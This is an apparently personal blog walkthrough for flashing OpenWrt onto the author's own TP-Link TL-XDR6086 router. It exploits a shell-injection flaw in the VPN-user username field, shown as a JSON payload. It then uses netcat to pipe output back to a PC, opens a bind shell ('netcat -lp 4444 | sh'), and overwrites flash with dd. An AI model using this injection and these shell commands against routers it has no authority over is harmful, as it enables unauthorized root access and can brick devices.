---
title: 'Install Openwrt in TP-Link TL-XDR6086'
description: 'use shell injection to flash Openwrt into TL-XDR6086'
pubDate: 'Aug 29 2024'
tags:
  - Router
  - OpenWrt
updatedDate: 'Nov 14 2024'
heroImageId: '727ee92c-717e-4d32-b8f2-98b9865c8300'
---

I thought I should buy a router before I would move to japan. 

For

1. OpenWrt Installable: I love openwrt, because of providing many unique functions like global transparent proxy.
2. Internal Antenna: Takes up less space and is neater.
3. 2.5 Gbps Cable Interface
4. Strong CPU: for OpenWrt and 2.5 Gbps bandwidth

I found TP-Link TL-XDR6086 in OpenWrt device list and bought one.

You can find the [tutorial](https://openwrt.org/toh/tp-link/xdr-6086) easily in OpenWrt website.

## Common knowledge you must know

It should be considered unusual that you can replace your router's operating system. Similar to gaining root access on an Android phone, this involves obtaining permissions that manufacturers intentionally restrict, typically through exploiting system vulnerabilities.

If you do what I did but in your case your router can never boot again, not my fault. It works on my machine.

You **should** search the device information in [OpenWrt Wiki](https://openwrt.org/toh/tp-link/xdr-6086), **not** Baidu, yahoo or other random somewhere.

You might need to download [built packages](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) from OpenWrt source, to avoid compile them manually.

I assume you know how to use Linux (or MacOS, freeBSD). If you only use Windows, get outta here.

## How the vulnerability works

When you call `http://192.168.1.1/stok=${STOK}/ds` to create a VPN user, there is a slot you can inject the shell command.

> After entering the admin page, use F12 to find the fetch requests, then you can get `${STOk}`.

```json
{
    "vpn":{
        "table":"user",
        "para":{
            "username":"; INJECT YOUR SHELL COMMAND HERE&",
            "password":"password1",
            "type":"l2tp",
            "netmode":"client2lan",
            "localip":"192.168.2.1",
            "dns":"1.1.1.1",
            "block":"0",
            "ippool":"new",
            "maxsessions":"1"
        },
        "name":"user_1"
    },
    "method":"add"
}
```

> For example, if you want to execute `echo 'fuck'`, `username` should be `;echo 'fuck'&`

Now, the shell command is stored in database. The trigger is when you delete this VPN user.

## Replace with OpenWrt

First, prepare a USB media. 

> By the way, based on what I've observed in Chinese forums, where many experienced users are skilled at bypassing CCP monitoring through VPNs, the most popular solution in Chinese OpenWrt community is to set up a TFTP server on a PC and configure the router to download everything from it.
>
> This is too troubling. For windows users, they even suggest them to install WSL then operate like a linux user.
>
> I think this is because many of them shares the solution without fully understanding why that works.

Download [`natcat`](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) into USB media. You'd better format it with FAT32, and rename the package into `netcat.ipk`.

### Mount USB media and prepare reflect shell

Run the following commands through the vulnerability I mentioned before.

```sh
mkdir /tmp/usb
```

Listen with netcat in your PC to receive the output from the injected shell.

```sh
nc -l -p 4444
```

> netcat is a network testing tool, also is widely used for reflect shell.
>
> Listen on your PC with netcat, and pipe the output of injected shell into `nc` in router, then you can get the output in your PC.
>
> If netcat is installed in the router, is is possible to listen with netcat on router from PC. By piping the message from pc, you can run the command from your PC.

For example, you can use this command to check if the creation is successful. Replace `192.168.1.100` with your PC's address.

```sh
ls -la /tmp | nc 192.168.1.100 4444
```

If succeed, mount the USB media. 

Attention that if you have plugged out the media, the number will increase, like `sda2` `sda3`, when you plug in. The number will recover to 1 after you reboot the device.

```sh
mount -t vfat /dev/sda1 /tmp/usb
```

> use `ls /dev | nc 192.168.1.100 4444` to find the name of USB media.

Check whether mounting is successful

```sh
ls -la /tmp/usb | nc 192.168.1.100 4444
```

Then, install natcat

```sh
opkg install /tmp/usb/netcat.ipk
```

Now, it is more convenient to run the shell command by netcat.

```sh
netcat -lp 4444 | sh
```

### Backup

backup to usb media:

```sh
dd if=/dev/mtdblock9 of=/tmp/usb/backup.img bs=131072
```

### Install U-Boot

**CAUTION: DANGEROUS OPERATION! Ensure acknowledging what and why you are doing!**

According to [this GitHub issue](https://github.com/hanwckf/immortalwrt-mt798x/issues/207), you can compile the u-boot from [the source code for bl-mt98x](https://github.com/hanwckf/bl-mt798x). *Of course you can also download form others*.

Execute these two commands *in order*. You must ensure the first one is successful then you can run the second one. Maybe the filename is different, the key is bl2 first then fip.

```sh
dd bs=131072 conv=sync of=/dev/mtdblock9 if=/tmp/usb/xdr608x-bl2.bin
dd bs=131072 conv=sync of=/dev/mtdblock9 seek=28 if=/tmp/usb/xdr608x-fip.bin
```

> use `2>&1 |` to receive the error

Set ip address in PC as `192.168.1.100/24`, the default gateway as `198.168.1.1`.

Cut off the power of router, then power up. If going well, the LED should blinks with red. Open <http://192.168.1.1> in browser and you can see the u-boot web ui.

![u-boot web ui](https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/5d6eb200-ac42-4b02-c09b-f689ec194d00/public)

### Install OpenWrt

As of August 29, 2024, XDR-6086 is not fully supported by OpenWrt. It is quite difficult to find OpenWrt firmware that is compatible with XDR-6086.

I find compatible one in a Chinese forum called En Shan Forum (恩山论坛).

